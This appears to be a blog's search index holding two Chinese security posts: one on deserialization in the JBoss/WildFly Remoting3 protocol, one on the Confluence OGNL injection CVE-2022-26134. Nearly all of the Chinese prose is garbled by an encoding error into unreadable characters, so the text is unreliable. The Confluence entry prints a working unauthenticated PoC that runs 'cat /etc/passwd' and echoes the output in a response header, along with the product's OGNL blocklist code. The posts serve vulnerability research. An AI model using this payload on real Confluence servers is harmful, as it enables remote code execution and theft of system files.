<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[JBoss\WildFly remoting3ÂçèËÆÆÂèçÂ∫èÂàóÂåñÂàÜÊûê]]></title>
    <url>%2F2022%2F06%2F28%2FJBoss%20WildFly%20remoting3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÂâçÊÆµÊó∂Èó¥ÂàÜÊûê‰∫ÜJBoss 3873Âíå4446Á´ØÂè£‰∏ãÁöÑÂèçÂ∫èÂàóÂåñÔºåÂèóÂΩ±ÂìçÁöÑÁâàÊú¨ÊúÄÊôöÂ∑≤ÁªèÊòØ2011Âπ¥ÂèëÂ∏ÉÁöÑÔºåËÄåJBoss EAP 6.XÂèäWildFly\JBoss AS 7.XÁ≠âÂêéÁª≠ÁâàÊú¨ÔºåÂÆÉ‰ª¨ÂèçÂ∫èÂàóÂåñÁõ∏ÂÖ≥ÁöÑCVEÂ∞±ÂæàÂ∞ë‰∫Ü„ÄÇÂΩíÊ†πÁªìÂ∫ïÔºåÊòØÂõ†‰∏∫‰ª•‰∏äÊâÄËØ¥ÁöÑÂêéÁª≠ÁâàÊú¨ÂºÉÁî®‰∫ÜÂéüÊù•ÁöÑRemoting2ÂçèËÆÆÔºåÂêØÁî®‰∫ÜRemoting3ÂçèËÆÆ„ÄÇÊú¨Êñá‰ª•Remoting3ÁöÑÂèçÂ∫èÂàóÂåñÁõ∏ÂÖ≥ÈóÆÈ¢òÂ±ïÂºÄÂàÜÊûê„ÄÇ Remoting3ÁÆÄ‰ªãRemoting3ÊòØJBoss RemotingÁöÑ‰∏ã‰∏Ä‰ª£ÂçèËÆÆÔºåÂÆÉÂú®ÂÖ∑Â§á‰∏ä‰∏Ä‰ª£ÂçèËÆÆÊâÄÂÖ∑ÊúâÁöÑÂäüËÉΩÁöÑÂêåÊó∂ÔºåËøòÂºïÂÖ•‰∫Ü‰ª•‰∏ã‰∏Ä‰∫õÊÄßÂäüËÉΩ„ÄÇ ÂèØÊãìÂ±ïÁöÑ‰º†ËæìÂçèËÆÆ ÂèØ‰ª•Âú®ËøêË°åÊó∂Ê£ÄÊµãÂÖ∂‰ªñÁöÑÂçèËÆÆ ÂèØÊãìÂ±ïÁöÑÊâìÂåÖÁ≠ñÁï•ÔºàMarshalling StrategiesÔºâ ‰ΩøÁî®Âº∫Â§ßÁöÑJBossÊâìÂåÖÂ∫ì Áõ∏ÊØîÊòéÊñáÁöÑJavaÂ∫èÂàóÂåñÊõ¥È´òÊïà ÂÆâÂÖ®ÂäüËÉΩ ÊîØÊåÅSSLÂçèËÆÆÔºåÂèØ‰ª•‰øùÊä§‰º†ËæìÊï∞ÊçÆÁöÑÂÆåÊï¥ÊÄßÂíåÊú∫ÂØÜÊÄßÔºåÂêåÊó∂‰πüÂèØÁî®Êù•ËÆ§ËØÅÊúçÂä°Á´Ø ÊîØÊåÅSASLÊ°ÜÊû∂ÔºåÂèØËøõË°åÂÆ¢Êà∑Á´ØËÆ§ËØÅÂíåÊéàÊùÉ ÈÄöËøáÊäìÂåÖÂØπÊØîÔºåÊ≠£Â¶ÇÂÆòÁΩë‰ªãÁªçÊâÄËØ¥ÔºåRemoting3ÂçèËÆÆ‰∏çÂêå‰∫éRemoting2ÁöÑÂá†‰πéÊòéÊñáÁöÑJavaÂ∫èÂàóÂåñÊï∞ÊçÆÔºåÂπ∂‰∏îÂú®ÈªòËÆ§ÈÖçÁΩÆ‰∏ãÈúÄË¶ÅÂÖàËøõË°åÂÆ¢Êà∑Á´ØÁöÑËÆ§ËØÅÊâçÂèØ‰ΩøÁî®ÂêéÁª≠ÁöÑEJB3ÊúçÂä°„ÄÇ ÂâçÈù¢ÊâÄËØ¥ÁöÑÂèØÊãìÂ±ïÁöÑ‰º†ËæìÂçèËÆÆÔºå‰ΩìÁé∞Âú®JBoss‰∏äÂç≥‰∏∫HTTPÊúçÂä°8080Á´ØÂè£ÁöÑ„ÄÇRemoting3ÂçèËÆÆÊîØÊåÅ‰∏§ÁßçEJB3ÊúçÂä°ÁõëÂê¨Ê®°ÂºèÔºöÁõ¥Êé•ÁõëÂê¨‰∏Ä‰∏™Á´ØÂè£ÂíåÂ§çÁî®HTTPÊúçÂä°ÁöÑÁ´ØÂè£„ÄÇÂâçËÄÖÊòØJBoss EAP 6.XÂíåJBoss AS 7.X‰ΩøÁî®ÁöÑÊ®°ÂºèÔºåÂØπÂ∫îÁöÑschemeÊòØremote://ÔºåËÄåÂêéËÄÖÊòØJBoss EAP 7.XÂíåWildFly‰ΩøÁî®ÁöÑÊ®°ÂºèÔºåÂØπÂ∫îÁöÑschemeÊòØhttp-remoting://Êàñhttp://ÔºàËßÜÁâàÊú¨ËÄåÂÆöÔºâ„ÄÇ Á´ØÂè£Â§çÁî®ËøôÂùó‰ªéÊµÅÈáèËøôÁúãÊòØÊØîËæÉÁÆÄÂçïÔºåÂÆ¢Êà∑Á´ØÂÖàÂèëÈÄÅ‰∏Ä‰∏™Â∏¶Upgrade: jboss-remotingÂ§¥ÁöÑHTTPËØ∑Ê±ÇÔºåÁÑ∂ÂêéÊúçÂä°Á´ØËøîÂõû101Áä∂ÊÄÅÁ†ÅÂàáÊç¢ÂçèËÆÆÔºåÂêéÁª≠ÊµÅÈáèÂàô‰∏éÁõëÂê¨Á´ØÂè£ÁöÑÊ®°ÂºèÊó†ÂºÇ„ÄÇ ÁéØÂ¢ÉÈÉ®ÁΩ≤Remoting3ÂçèËÆÆÊúçÂä°‰∫éEJB3ÔºåËÄåEJB3‰∏éRMIÁ±ª‰ººÔºåÊîØÊåÅÂØπË±°‰º†ÂèÇÔºåÊ∂âÂèäÂà∞ÂØπË±°ÂèÇÊï∞ÂøÖÁÑ∂‰ºö‰∏éÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÊâØ‰∏äÂÖ≥Á≥ª„ÄÇË¶ÅÁ†îÁ©∂Remoting3ÂçèËÆÆÁöÑÂèçÂ∫èÂàóÂåñÊú∫Âà∂ÔºåÈ¶ñÂÖàÂæóÈÉ®ÁΩ≤‰∏Ä‰∏™EJB3ÁöÑÊúçÂä°„ÄÇÊú¨ÊñáÂêéÁª≠ÁöÑÂàÜÊûêÂùá‰ª•WildFly 8.2.1.Final‰∏∫‰æãÔºå‰∏ãËΩΩÁõ∏Â∫îÁöÑÁâàÊú¨ÔºåÂú®ÂêØÂä®ÂâçÂÖà‰ΩøÁî®bin/add-user.shËÑöÊú¨Ê∑ªÂä†‰∏Ä‰∏™Áî®Êà∑„ÄÇ Â∞Ü‰ª•‰∏ã‰∏§‰∏™Á±ªÁºñËØë‰∏∫JarÂåÖÔºåÂπ∂‰ªé9990Á´ØÂè£ÁôªÂΩïÂà∞ÊéßÂà∂Âè∞ÔºåÈÉ®ÁΩ≤ÊâìÂåÖÂ•ΩÁöÑJarÂåÖ„ÄÇ 123456789package com.illucit.ejbremote.server;import javax.ejb.Remote;@Remotepublic interface ExampleService &#123; public Object greet(Object object);&#125; 12345678910111213package com.illucit.ejbremote.server;import javax.ejb.Stateless;@Statelesspublic class ExampleServiceImpl implements ExampleService &#123; @Override public Object greet(Object object) &#123; return object; &#125;&#125; Êñ∞Âª∫‰∏Ä‰∏™JavaÈ°πÁõÆÔºåÂπ∂Â∞ÜWildFlyÁöÑbin/clientÁõÆÂΩï‰∏ãÁöÑjarÂåÖÂ§çÂà∂Âà∞È°πÁõÆÁöÑlibÁõÆÂΩïÔºåÂêåÊó∂Â∞Ü‰ª•‰∏ä‰∏§‰∏™Á±ª‰πüÂä†ÂÖ•Âà∞È°πÁõÆ‰∏≠„ÄÇÁÑ∂ÂêéÂú®resourceÁõÆÂΩï‰∏ãÊ∑ªÂä†jboss-ejb-client.propertiesÔºåÂ°´ÂÖ•‰ª•‰∏ãÈÖçÁΩÆÂÜÖÂÆπ„ÄÇ 12345remote.connections=defaultremote.connection.default.host=192.168.78.132remote.connection.default.port = 8080remote.connection.default.username=&lt;username&gt;remote.connection.default.password=&lt;password&gt; ÊúÄÂêéÊ∑ªÂä†‰ª•‰∏ãÁ±ª‰Ωú‰∏∫ÂÆ¢Êà∑Á´ØÔºåË∞ÉÁî®ËøúÁ®ãEJB3ÊúçÂä°„ÄÇ 1234567891011121314151617181920212223242526import com.illucit.ejbremote.server.ExampleService;import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException;import java.util.Date;import java.util.Hashtable;public class Client &#123; public static void main(String[] args) throws Exception &#123; System.out.printf(String.valueOf(lookupExample().greet2(new Date()))); &#125; private static ExampleService lookupExample() throws NamingException &#123; final Hashtable&lt;String, String&gt; jndiProperties = new Hashtable(); jndiProperties.put(Context.URL_PKG_PREFIXES, "org.jboss.ejb.client.naming"); final Context context = new InitialContext(jndiProperties); String url = "ejb:/ejb-remote-server/ExampleServiceImpl!" + ExampleService.class.getName(); System.out.println(url); return (ExampleService) context.lookup(url); &#125;&#125; ÊäÄÊúØÂàÜÊûêÈ¶ñÂÖàÁî®‰∏Ä‰∏™Âú®ÊúçÂä°Á´Ø‰∏çÂ≠òÂú®ÁöÑÁ±ª‰Ωú‰∏∫ÂèÇÊï∞ÔºåË∞ÉÁî®EJB3ÊúçÂä°„ÄÇÂú®ÂÆ¢Êà∑Á´ØÊäõÂá∫ÁöÑÂºÇÂ∏∏‰ø°ÊÅØÁöÑË∞ÉÁî®Ê†à‰∏≠ÔºåÂèØ‰ª•ÁúãÂà∞org.jboss.marshalling.AbstractObjectInputÁöÑreadObjectÊñπÊ≥ïË¢´Ë∞ÉÁî®„ÄÇ Âú®ÊúçÂä°Á´ØËØ•ÊñπÊ≥ï‰∏ãÊñ≠ÁÇπÔºåÂΩìÂâçÁöÑÁ±ªÊòØAbstractObjectInputÁöÑÂ≠êÁ±ªorg.jboss.marshalling.river.RiverUnmarshallerÔºåÂèëÂ∫èÂàóÂåñË∞ÉÁî®Ëá™Ë∫´ÁöÑdoReadObjectÊñπÊ≥ïÂ§ÑÁêÜ„ÄÇ Ë∑üËøõÂà∞doReadObjectÊñπÊ≥ïÔºå‰ª£Á†Å‰∏≠‰ºöÊúâ‰∏Ä‰∏™switchÂæ™ÁéØ‰ΩìÔºåÊ†πÊçÆ‰ªéËæìÂÖ•ÊµÅËé∑ÂèñÂà∞ÁöÑÂ≠óËäÇËøõÂÖ•‰∏çÂêåÁöÑÂàÜÊîØ„ÄÇÂêéÁª≠‰ºöË¢´Ë∞ÉÁî®Âà∞ÁöÑdoReadNewObjectÂíådoReadClassDescriptor‰πü‰ºöÊúâ‰∏Ä‰∏™switchÂæ™ÁéØ‰ΩìÔºåÊÉ≥ÂøÖÂ∞±ÊòØÂÆòÊñπÊâÄËØ¥ÁöÑÂèØÊãìÂ±ïÁöÑÊâìÂåÖÁ≠ñÁï•„ÄÇ ÈÄöËøáÊéßÂà∂ËæìÂÖ•ÊµÅËøõÂÖ•Âà∞switchÂæ™ÁéØÂà§Êñ≠ÁöÑÂ≠óËäÇÔºå‰ªéËÄåÂèØ‰ª•ÊéßÂà∂ËøîÂõûÁ±ªÁ§∫‰æãÊàñËÄÖÂèçÂ∫èÂàóÂåñÂØπË±°„ÄÇÁ¨îËÄÖÊ¢≥ÁêÜ‰∫ÜËøô‰∫õswitchÂæ™ÁéØ‰ΩìÁöÑÂàÜÊîØÔºåÊï¥ÁêÜ‰∫ÜÂá†‰∏™‰ºöËøîÂõûÂèçÂ∫èÂàóÂåñÂØπË±°ÁöÑÊµÅÁ®ãÔºå‰ªñ‰ª¨Êó†‰∏Ä‰æãÂ§ñÁöÑ‰ºöÁõ¥Êé•readObjectÂèçÂ∫èÂàóÂåñÊàñloadClassÂèçÂ∞ÑÁ±ªÂÆû‰æãÔºåÊ≠§Êó∂‰ªñ‰ª¨ÁöÑÁ±ªÂä†ËΩΩÂô®ÈÉΩÊòØModuleClassLoader„ÄÇ ËøôÊòØ‰∏Ä‰∏™ÂæàÁâπÊÆäÁöÑÁ±ªÂä†ËΩΩÂô®ÔºåÂèçÂ∫èÂàóÂåñÂà©Áî®Èìæ‰∏≠Â∏∏ËßÅÁöÑÁ±ªÔºåÊØîÂ¶ÇUnicastRef„ÄÅCCÈìæÔºàÁ®ãÂ∫è‰∏≠ÂÆûÈôÖÊúâÁî®Âà∞Ëøô‰∏™‰æùËµñÔºâÔºåÁîöËá≥‰∫éÂéüÁîüÂèçÂ∫èÂàóÂåñÈìæ‰∏≠ÁöÑ‰∏Ä‰∫õÁ±ªÈÉΩÊòØÊó†Ê≥ïÂä†ËΩΩÁöÑ„ÄÇ ÂÆûÊµãÂè™Êúâ‰∏§‰∏™moduleË∑ØÂæÑ‰∏ãjarÂåÖÈáåÁöÑÈÉ®ÂàÜÁ±ªÂíåjdkÈÉ®ÂàÜÂéüÁîüÁ±ªÂèØ‰ª•Ë¢´Ëøô‰∏™Á±ªÂä†ËΩΩÂô®Âä†ËΩΩ„ÄÇÂú®ÂèØ‰ª•Âä†ËΩΩÁöÑÁ±ª‰∏≠ËÉΩÊâæÂà∞‰∏Ä‰∫õSinkÁ±ªÔºåÊØîÂ¶ÇValueExpressionImpl„ÄÅMethodExpressionImplÔºåÂú®RichFacesÁöÑCVE-2018-12533‰∏≠ÊúâÁî®Âà∞Ëøô‰∏§‰∏™SinkÁ±ªÁöÑÂèëÂ∫èÂàóÂåñÈìæÔºå‰ΩÜSourceÂíåGadgetÁ±ªËôΩÁÑ∂ÊúâÔºå‰ΩÜModuleClassLoaderÁ±ªÂä†ËΩΩÂô®Âπ∂‰∏çËÉΩÂä†ËΩΩ„ÄÇ ÂèçÂ∫èÂàóÂåñËøôÊù°Ë∑ØË°å‰∏çÈÄöÔºåÂõûÁúãË∞ÉÁî®Ê†à‰∏≠Â§ÑÁêÜÊ∂àÊÅØÁöÑÊñπÊ≥ïprocessMessage„ÄÇÂºÄÂ§¥Áî®ÂèçÂ∫èÂàóÂåñËé∑ÂèñappName„ÄÅmoduleName„ÄÅdistinctNameÂíåbeanNameÔºå‰πüÂ∞±ÊòØÂÆ¢Êà∑Á´ØlookupÊü•ËØ¢ÁöÑurl„ÄÇËôΩËØ¥ËøôÁßçÁî®Ê≥ïÂ≠òÂú®È£éÈô©ÔºåÂú®‰∏çÁü•ÈÅìÈÉ®ÁΩ≤‰∫Ü‰ªÄ‰πàEJB3ÊúçÂä°ÁöÑÊÉÖÂÜµ‰∏ãÔºå‰πüÂèØ‰ª•ËøõË°åÂèçÂ∫èÂàóÂåñÔºå‰ΩÜÁõÆÂâçËµ∑Êù•ÊúâÈöæÂ∫¶ÔºåÊâÄ‰ª•ÊöÇÊó∂‰πüÊ≤°Êúâ‰ªÄ‰πàÈóÆÈ¢ò„ÄÇ Êé•ÁùÄÁúãÂêéÈù¢ÁöÑ‰ª£Á†ÅÔºåÊúâ‰∏Ä‰∏™ÂèçÂ∞ÑMethodÁöÑÊìç‰ΩúÔºå‰ªéEJB3ÈÉ®ÁΩ≤‰ø°ÊÅØËé∑ÂèñÂà∞ÁöÑComponentViewÔºåÊ†πÊçÆÊñπÊ≥ïÂêçÂíåÊñπÊ≥ïÂèÇÊï∞ÂèçÂ∞ÑMethod„ÄÇÂõûÊ∫ØMethodÁöÑÊù•Ê∫êÔºåÂèëÁé∞ÊòØ‰∏éÂèçÂ∫èÂàóÂåñÁöÑlocatorÊúâÂÖ≥„ÄÇËøô‰∏™locatorÂÖ∂ÂÆûÂ∞±ÊòØÂ∞ÅË£Ö‰∫ÜÂÆ¢Êà∑Á´ØEJB3ÊúçÂä°Êé•Âè£ÁöÑEJBLocatorÔºåÈÇ£ÂèØ‰ª•ÂÆ¢Êà∑Á´Ø‰ΩøÁî®ÊÅ∂ÊÑèÁöÑEJB3ÊúçÂä°Êé•Âè£Ôºå‰ªéËÄåÂèçÂ∞ÑÊúçÂä°Á´ØÁ±ªÁöÑÊñπÊ≥ïÔºüÁ¨îËÄÖ‰πüÂÅö‰∫Ü‰∏ãÂ∞ùËØïÔºå‰ΩÜËã•ÊÉ≥Ë¶ÅÂèçÂ∞ÑÁöÑÊúçÂä°Á´ØÁ±ª‰∏çÊòØ‰∏Ä‰∏™Êé•Âè£Á±ªÔºåÂàô‰ºöÊäõÂá∫‰∏Ä‰∏™ÂÜÖÊé•Âè£Á±ªÁöÑÂºÇÂ∏∏ÔºåÂç≥‰ΩøÊòØÊ≤°ÊúâÊäõÂá∫ÂºÇÂ∏∏Ôºå‰ªéÈÉ®ÁΩ≤‰ø°ÊÅØËé∑ÂèñComponentViewËøô‰∏ÄÊ≠•‰πüÊ≤°Ê≥ïËé∑ÂèñÊúçÂä°Á´ØEJB3ÊúçÂä°Êé•Âè£‰πãÂ§ñÁöÑÂÜÖÂÆπ„ÄÇ ÂêéËÆ∞Remoting3ÂçèËÆÆÁöÑÂàÜÊûêÂéüÊú¨ÊòØ‰ª•ÊåñÊéòÂçèËÆÆÊºèÊ¥û‰∏∫ÁõÆÁöÑÔºå‰ΩÜÊúÄÁªà‰πüÊ≤°ÊúâÂèëÁé∞‰ªÄ‰πàÂ§™Â§ßÁöÑÈóÆÈ¢òÔºå‰∏çÂæó‰∏çÊÑüÂèπÁé∞Âú®JBoss\WildFlyÁöÑÁâàÊú¨ÊØî‰πãÂâç‰ΩøÁî®remoting2ÂçèËÆÆÁöÑÁâàÊú¨ÂÆâÂÖ®ÊÄß‰∏äÂçá‰∫Ü‰∏Ä‰∏™Âè∞Èò∂„ÄÇÁøªÁúãËøëÂπ¥WildFlyÁöÑCVEÔºåÊúâ‰∏Ä‰∏™ÂèçÂ∫èÂàóÂåñÁõ∏ÂÖ≥ÁöÑCVE-2020-10740ÔºåÊ≤°ÊúâÈ™åËØÅÊú∫Âà∂‰ΩøÂæóÂèØËÉΩÈÄöËøáEJBÂèëËµ∑ËøúÁ®ãÂèëÂ∫èÂàóÂåñÊîªÂáªÔºåËØ¥ÁöÑÂ§ßÊ¶ÇÂ∞±ÊòØÊú¨ÊñáËÆ®ËÆ∫ÁöÑÂÜÖÂÆπ„ÄÇÊü•ÁúãÂú®WildFly20.0ÂèëÂ∏ÉÁöÑ‰øÆÂ§çÔºå‰ªÖ‰ªÖÊòØÂ¢ûÂä†‰∫ÜÈªëÂêçÂçïÈ™åËØÅ„ÄÇ Èô§Ê≠§‰πãÂ§ñÔºåÂÆ¢Êà∑Á´ØËøòÊúâ‰∏™‰∏çÂ§ß‰∏çÂ∞èÁöÑÈóÆÈ¢òÔºåÂÆÉÁöÑÂèçÂ∫èÂàóÂåñÊµÅÁ®ãÂíåÊúçÂä°Á´ØÂ∑Æ‰∏çÂ§öÔºå‰ΩÜÂÆ¢Êà∑Á´ØËøôÈáåÁöÑÁ±ªÂä†ËΩΩÂô®Â∞±ÊòØÊôÆÈÄöÁöÑÁ±ªÂä†ËΩΩÂô®ÔºåÂèØ‰ª•Áî®Âà∞ÈÉ®ÂàÜÁöÑÂèëÂ∫èÂàóÂåñÈìæÔºåËøôÂú∫ÊôØÂ∞±ÊúâÁÇπÂÉèRMIÁöÑÂèëÂ∫èÂàóÂåñÊúçÂä°Á´Ø‰º†Êù•ÁöÑÊÅ∂ÊÑèÁªìÊûúÊàñÂºÇÂ∏∏„ÄÇ‰πüËÆ∏ËÉΩÁî®Âú®ÂèçÂà∂„ÄÅ‰∏≠Èó¥‰∫∫ÊîªÂáªÁ≠âÂú∫ÊôØ„ÄÇ„ÄÇ Êñá‰∏≠Ëã•Êúâ‰ªÄ‰πàÈîôËØØÁöÑÂú∞ÊñπÔºåÊï¨ËØ∑Â∏àÂÇÖ‰ª¨ÊñßÊ≠£„ÄÇ ÂèÇËÄÉhttps://jbossremoting.jboss.org/remoting-3 https://paper.seebug.org/766/ https://github.com/illucIT/remote-ejb-example]]></content>
      <categories>
        <category>‰ª£Á†ÅÂÆ°ËÆ°</category>
      </categories>
      <tags>
        <tag>ÂèçÂ∫èÂàóÂåñ</tag>
        <tag>JBoss</tag>
        <tag>remoting</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Confluence OGNLË°®ËææÂºèÊ≥®ÂÖ•ÂàÜÊûêÔºàCVE-2022-26134Ôºâ]]></title>
    <url>%2F2022%2F06%2F08%2FConfluence%20OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-26134%EF%BC%89%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Atlassian ConfluenceÊòØ‰ºÅ‰∏öÂπøÊ≥õ‰ΩøÁî®ÁöÑwikiÁ≥ªÁªü„ÄÇ2022Âπ¥6Êúà2Êó•AtlassianÂÆòÊñπÂèëÂ∏É‰∫Ü‰∏ÄÂàôÂÆâÂÖ®Êõ¥Êñ∞Ôºå Confluence‰∏äÂ≠òÂú®‰∏Ä‰∏™‰∏•ÈáçÁöÑÊú™ÁªèË∫´‰ªΩÈ™åËØÅÁöÑËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û„ÄÇOGNLÊ≥®ÂÖ•ÊºèÊ¥ûÂÖÅËÆ∏Êú™ÁªèË∫´‰ªΩÈ™åËØÅÁöÑÁî®Êà∑Âú®Confluence ServerÊàñData CenterÂÆû‰æã‰∏äÊâßË°å‰ªªÊÑè‰ª£Á†Å„ÄÇ ÊºèÊ¥ûÂàÜÊûêÂú®RuntimeÂ§Ñ‰∏ãÊñ≠ÁÇπÔºåÂºÄÂ§¥ÁªèËøá‰∏ÄËøû‰∏≤ÁöÑFilterChainÔºå‰ΩÜFilterÈÉΩÊ≠£Â∏∏ÊâßË°åÂÆå‰∫ÜÔºåÊòæÁÑ∂ÊºèÊ¥û‰∏éFilterÊó†ÂÖ≥„ÄÇÁõ¥Êé•Ë∑üËøõÂà∞com.atlassian.confluence.servlet.ConfluenceServletDispatcherÁà∂Á±ªÁöÑserviceÊñπÊ≥ïÔºåÂú®ËøôÈáåÂºÄÂßãÂ§ÑÁêÜServletÁöÑËØ∑Ê±Ç„ÄÇ 12345678910111213141516171819202122exec:443, Runtime (java.lang)...getValue:333, Ognl (ognl)getValue:310, Ognl (ognl)findValue:141, OgnlValueStack (com.opensymphony.xwork.util)translateVariables:39, TextParseUtil (com.opensymphony.xwork.util)execute:95, ActionChainResult (com.opensymphony.xwork)executeResult:263, DefaultActionInvocation (com.opensymphony.xwork)invoke:187, DefaultActionInvocation (com.opensymphony.xwork)intercept:21, FlashScopeInterceptor (com.atlassian.confluence.xwork)invoke:165, DefaultActionInvocation (com.opensymphony.xwork)...execute:115, DefaultActionProxy (com.opensymphony.xwork)serviceAction:56, ConfluenceServletDispatcher (com.atlassian.confluence.servlet)service:199, ServletDispatcher (com.opensymphony.webwork.dispatcher)service:764, HttpServlet (javax.servlet.http)internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)doFilter:162, ApplicationFilterChain (org.apache.catalina.core)doFilter:53, WsFilter (org.apache.tomcat.websocket.server)internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)...doFilter:162, ApplicationFilterChain (org.apache.catalina.core) ÁÑ∂ÂêéÂú®ÊâßË°å‰∏ÄÁ≥ªÂàóÁöÑInterceptorÂêéÔºåÊù•Âà∞‰∫ÜConfluenceAccessInterceptorÔºåÈ™åËØÅÊòØÂê¶ÊúâÊùÉÈôêËÆøÈóÆ„ÄÇÊ≠§Êó∂Âπ∂Ê≤°ÊúâÁôªÂΩïÔºåÊâÄ‰ª•È¶ñÊ¨°ËÆæÁΩÆ‰∫ÜËøîÂõûÈ°µÈù¢Áä∂ÊÄÅnotpermittedÔºå‰∏îÊ≤°ÊúâÁªßÁª≠ÈÄíÂΩíÂà∞‰∏ã‰∏Ä‰∏™Interceptor„ÄÇ Áî±‰∫éÊ≤°ÊúâÁªßÁª≠ÈÄíÂΩíInterceptorÔºå‰∏îÊ≤°ÊúâËøòÊú™ÊâßË°åÁõ∏Â∫îÁöÑActionÔºåÊâÄ‰ª•‰∏æË°åÊâßË°åinvokeÊñπÊ≥ïÁöÑÂêéÁª≠‰ª£Á†ÅÔºåËøõÂÖ•Âà∞com.opensymphony.xwork.DefaultActionInvocation#executeResultÊñπÊ≥ï„ÄÇ Ë∑üËøõÂà∞executeResultÊñπÊ≥ïÔºåÈ¶ñÂÖà‰ºöÊâßË°åÊú¨Á±ª‰∏≠ÁöÑcreateResultÊñπÊ≥ïÔºåÂÜçÊ¨°Ë∑üËøõ„ÄÇ‰ª£Á†ÅÁöÑÈÄªËæëÊòØÊ†πÊçÆÈ°µÈù¢ÁöÑÁä∂ÊÄÅËøîÂõûÁõ∏Â∫îÁöÑResultÁ±ªÂûã„ÄÇ ÂΩìÂâçÁöÑÁä∂ÊÄÅÊòØnotpermittedÔºåÊâÄ‰ª•ËøîÂõûÁöÑResultÂ∞±ÊòØcom.opensymphony.xwork.ActionChainResult„ÄÇÈóÆÈ¢ò‰πüÂá∫Âú®ActionChainResultËøôÈáåÔºåÂÆÉÁöÑexecute‰ºöË¢´DefaultActionInvocationÁöÑexecuteResultÊñπÊ≥ïË∞ÉÁî®„ÄÇÂÖ∂‰∏≠‰ºöÁî®com.opensymphony.xwork.util.TextParseUtil#translateVariablesÊñπÊ≥ïÔºå‰ª•OGNLË°®ËææÂºèÊñπÂºèËß£ÊûênamespaceÔºå‰πüÂ∞±ÊòØÊàë‰ª¨‰º†ÂÖ•ÁöÑÂèØÊéßÁöÑË∑ØÂæÑÔºåÂØºËá¥‰∫ÜOGNLË°®ËææÂºèÊ≥®ÂÖ•„ÄÇ ÊúÄÂêéÁöÑPOCÂ∞±ÊòØOGNLË°®ËææÂºèÊ≥®ÂÖ•ÁöÑPOC‰∫ÜÔºåÊØîÂ¶Ç‰ª•‰∏ãÂπø‰∏∫ÊµÅ‰º†ÁöÑÂõûÊòæPOCÔºö 1/$&#123;(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;cat /etc/passwd&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))&#125; Ê≤ôÁÆ±ÁªïËøáÁúãÂà∞ÊúâÊñáÁ´†ËØ¥Á®çÈ´òÁöÑÁâàÊú¨Âä†ÂÖ•‰∫ÜOGNLÁöÑÊ≤ôÁÆ±Ôºå‰∏ãËΩΩ‰∫Ü‰∏™ÊµãËØï‰∫ÜÁ°ÆÂÆûÂ¶ÇÊ≠§„ÄÇÂú®OgnlValueStackÁöÑfindValueÊñπÊ≥ïË∞ÉÁî®‰∫ÜisSafeExpressionÊñπÊ≥ïÂÅöË°®ËææÂºèÁöÑÈ™åËØÅ„ÄÇÈ™åËØÅÁöÑ‰∏ªË¶ÅÈÄªËæëÂú®com.opensymphony.xwork.util.SafeExpressionUtil#containsUnsafeExpressionÊñπÊ≥ï„ÄÇ 12345678910111213141516171819202122232425private boolean containsUnsafeExpression(Node node, Set&lt;String&gt; visitedExpressions) &#123; String nodeClassName = node.getClass().getName(); if (UNSAFE_NODE_TYPES.contains(nodeClassName)) &#123; // 0 = "ognl.ASTStaticField" 1 = "ognl.ASTCtor" 2 = "ognl.ASTAssign" return true; &#125; else if ("ognl.ASTStaticMethod".equals(nodeClassName) &amp;&amp; !this.allowedClassNames.contains(getClassNameFromStaticMethod(node))) &#123; return true; &#125; else if ("ognl.ASTProperty".equals(nodeClassName) &amp;&amp; this.isUnSafeClass(node.toString())) &#123; return true; &#125; else if ("ognl.ASTMethod".equals(nodeClassName) &amp;&amp; this.unsafeMethodNames.contains(getMethodInOgnlExp(node))) &#123; return true; &#125; else if ("ognl.ASTVarRef".equals(nodeClassName) &amp;&amp; UNSAFE_VARIABLE_NAMES.contains(node.toString())) &#123; return true; &#125; else if ("ognl.ASTConst".equals(nodeClassName) &amp;&amp; !this.isSafeConstantExpressionNode(node, visitedExpressions)) &#123; return true; &#125; else &#123; for(int i = 0; i &lt; node.jjtGetNumChildren(); ++i) &#123; Node childNode = node.jjtGetChild(i); if (childNode != null &amp;&amp; this.containsUnsafeExpression(childNode, visitedExpressions)) &#123; return true; &#125; &#125; return false; &#125;&#125; ËØ•ÊñπÊ≥ïÁ¶ÅÊ≠¢‰∫ÜÈùôÊÄÅÂ±ûÊÄß„ÄÅÊûÑÈÄ†ÊñπÊ≥ïÔºåÂíåÂØπÂ±ûÊÄß„ÄÅÊñπÊ≥ï„ÄÅOGNLÂèòÈáè„ÄÅÂ∏∏ÈáèËøõË°åÈªëÂêçÂçïÈ™åËØÅÔºåÂØπÈùôÊÄÅÊñπÊ≥ïËøõË°åÁôΩÂêçÂçïÈ™åËØÅ„ÄÇ 